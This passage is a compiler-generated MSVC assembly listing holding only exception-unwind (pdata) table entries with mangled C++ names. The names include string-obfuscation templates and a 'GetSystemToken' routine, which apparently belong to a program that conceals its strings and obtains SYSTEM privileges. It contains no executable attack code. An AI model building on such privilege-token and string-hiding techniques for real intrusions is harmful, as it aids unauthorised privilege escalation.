	DD	imagerel $unwind$??$find@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$count@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD imagerel $LN41
	DD	imagerel $LN41+113
	DD	imagerel $unwind$??$count@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Copy_memmove@PEBQEBDPEAPEBD@std@@YAPEAPEBDPEBQEBD0PEAPEBD@Z DD imagerel $LN4
	DD	imagerel $LN4+48
	DD	imagerel $unwind$??$_Copy_memmove@PEBQEBDPEAPEBD@std@@YAPEAPEBDPEBQEBD0PEAPEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Alloc_sentinel_and_proxy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ DD imagerel $LN31
	DD	imagerel $LN31+35
	DD	imagerel $unwind$?_Alloc_sentinel_and_proxy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z DD imagerel $LN34
	DD	imagerel $LN34+111
	DD	imagerel $unwind$?allocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z DD imagerel $LN41
	DD	imagerel $LN41+47
	DD	imagerel $unwind$??0?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?deallocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z DD imagerel $LN23
	DD	imagerel $LN23+66
	DD	imagerel $unwind$?deallocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z DD imagerel $LN103
	DD	imagerel $LN103+54
	DD	imagerel $unwind$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z DD imagerel $LN103+54
	DD	imagerel $LN103+257
	DD	imagerel $chain$0$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z DD imagerel $LN103+257
	DD	imagerel $LN103+306
	DD	imagerel $chain$1$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z DD imagerel $LN103+306
	DD	imagerel $LN103+318
	DD	imagerel $chain$2$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@QEBA@QEADQEBD_KD@Z DD imagerel $LN18
	DD	imagerel $LN18+57
	DD	imagerel $unwind$??R<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@QEBA@QEADQEBD_KD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?deallocate@?$allocator@PEBD@std@@QEAAXQEAPEBD_K@Z DD imagerel $LN23
	DD	imagerel $LN23+66
	DD	imagerel $unwind$?deallocate@?$allocator@PEBD@std@@QEAAXQEAPEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ DD imagerel $LN51
	DD	imagerel $LN51+35
	DD	imagerel $unwind$?_Tidy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z DD imagerel $LN67
	DD	imagerel $LN67+160
	DD	imagerel $unwind$??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAXXZ DD imagerel $LN34
	DD	imagerel $LN34+91
	DD	imagerel $unwind$?_Tidy@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z DD imagerel $LN18
	DD	imagerel $LN18+79
	DD	imagerel $unwind$??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z DD imagerel $LN52
	DD	imagerel $LN52+69
	DD	imagerel $unwind$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z DD imagerel $LN52+69
	DD	imagerel $LN52+205
	DD	imagerel $chain$2$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z DD imagerel $LN52+205
	DD	imagerel $LN52+213
	DD	imagerel $chain$4$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z DD imagerel $LN52+213
	DD	imagerel $LN52+228
	DD	imagerel $chain$5$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@PEBD@std@@QEAAPEAPEBD_K@Z DD imagerel $LN34
	DD	imagerel $LN34+111
	DD	imagerel $unwind$?allocate@?$allocator@PEBD@std@@QEAAPEAPEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@XZ DD imagerel $LN35
	DD	imagerel $LN35+91
	DD	imagerel $unwind$??1?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAXXZ DD imagerel $LN31
	DD	imagerel $LN31+91
	DD	imagerel $unwind$?_Tidy@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlength@?$vector@PEBDV?$allocator@PEBD@std@@@std@@CAXXZ DD imagerel $LN4
	DD	imagerel $LN4+17
	DD	imagerel $unwind$?_Xlength@?$vector@PEBDV?$allocator@PEBD@std@@@std@@CAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ DD imagerel $LN55
	DD	imagerel $LN55+35
	DD	imagerel $unwind$??1?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z DD imagerel $LN171
	DD	imagerel $LN171+324
	DD	imagerel $unwind$?erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ DD imagerel $LN38
	DD	imagerel $LN38+91
	DD	imagerel $unwind$??1?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ DD imagerel $LN80
	DD	imagerel $LN80+162
	DD	imagerel $unwind$??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?at@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAAEAPEAUHINSTANCE__@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z DD imagerel $LN41
	DD	imagerel $LN41+113
	DD	imagerel $unwind$?at@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAAEAPEAUHINSTANCE__@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??B?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAPEADXZ DD imagerel $LN4
	DD	imagerel $LN4+20
	DD	imagerel $unwind$??B?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??B?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAPEADXZ DD imagerel $LN4
	DD	imagerel $LN4+20
	DD	imagerel $unwind$??B?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??B?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAPEADXZ DD imagerel $LN4
	DD	imagerel $LN4+20
	DD	imagerel $unwind$??B?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??B?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAPEADXZ DD imagerel $LN4
	DD	imagerel $LN4+20
	DD	imagerel $unwind$??B?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??B?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAPEADXZ DD imagerel $LN4
	DD	imagerel $LN4+20
	DD	imagerel $unwind$??B?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??B?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAPEADXZ DD imagerel $LN4
	DD	imagerel $LN4+20
	DD	imagerel $unwind$??B?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ DD imagerel ??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ
	DD	imagerel ??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ+167
	DD	imagerel $unwind$??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ DD imagerel ??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ+111
